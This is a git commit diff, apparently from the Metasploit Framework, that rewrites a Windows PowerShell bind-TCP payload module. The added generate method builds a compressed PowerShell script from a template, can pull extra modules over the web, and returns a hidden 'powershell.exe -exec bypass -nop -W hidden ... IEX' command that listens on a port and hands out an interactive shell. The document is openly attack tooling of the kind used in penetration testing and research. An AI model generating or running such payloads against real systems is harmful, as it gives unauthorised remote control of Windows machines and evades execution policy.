ded904c72cc0a70fa3e6fb062f8cbc8e6178b63f
benpturner <benpturner@yahoo.com>
2015-04-26 00:16:59 +0100

    New payloads

--- modules/payloads/singles/cmd/windows/powershell_bind_tcp.rb
+++ modules/payloads/singles/cmd/windows/powershell_bind_tcp.rb
@@ -4,23 +4,28 @@
 ##
 
 require 'msf/core'
-require 'msf/core/handler/find_shell'
 require 'msf/base/sessions/powershell'
-require 'msf/base/sessions/command_shell'
-require 'msf/base/sessions/command_shell_options'
 
 module Metasploit3
 
   CachedSize = 0
 
   include Msf::Payload::Single
-  include Msf::Sessions::CommandShellOptions
+  include Rex::Powershell::Command
 
   def initialize(info = {})
     super(merge_info(info,
-      'Name'          => 'Windows Bind Powershell, Interact with Established Connection',
-      'Description'   => 'Interacts with a powershell session on an established socket connection',
-      'Author'        => 'hdm',
+      'Name'          => 'Windows Interactive Powershell Session, Bind TCP',
+      'Description'   => 'Listen for a connection and spawn an interactive powershell session',
+      'Author'        =>
+        [
+          'Ben Turner', # benpturner
+          'Dave Hardy' # davehardy20
+        ],
+      'References'    =>
+        [
+          ['URL', 'https://www.nettitude.co.uk/interactive-powershell-session-via-metasploit/']
+        ],
       'License'       => MSF_LICENSE,
       'Platform'      => 'windows',
       'Arch'          => ARCH_CMD,
@@ -34,6 +39,40 @@ module Metasploit3
           'Payload' => ''
         }
       ))
+      register_options(
+      [
+        OptString.new('LOAD_MODULES', [ false, "A list of powershell modules seperated by a comma to download over the web", nil ]),
+      ], self.class)
+  end
+
+  def generate
+    lport = datastore['LPORT']
+
+    template_path = File.join(
+    Msf::Config.data_directory,
+    'exploits',
+    'powershell',
+    'powerfun.ps1')
+
+    script_in = File.read(template_path)
+    script_in << "\npowerfun -Command bind"
+
+    mods = ''
+
+    if datastore['LOAD_MODULES']
+      mods_array = datastore['LOAD_MODULES'].to_s.split(',')
+      mods_array.collect(&:strip)
+      print_status("Loading #{mods_array.count} modules into the interactive PowerShell session")
+      mods_array.each {|m| vprint_good " #{m}"}
+      mods = "\"#{mods_array.join("\",\n\"")}\""
+      script_in << " -Download true\n"
+    end
+
+    script_in.gsub!('MODULES_REPLACE', mods)
+    script_in.gsub!('LPORTs_REPLACE', lport.to_s)
+
+    script = Rex::Powershell::Command.compress_script(script_in)
+    "powershell.exe -exec bypass -nop -W hidden -noninteractive IEX $(#{script})"
   end
 
 end
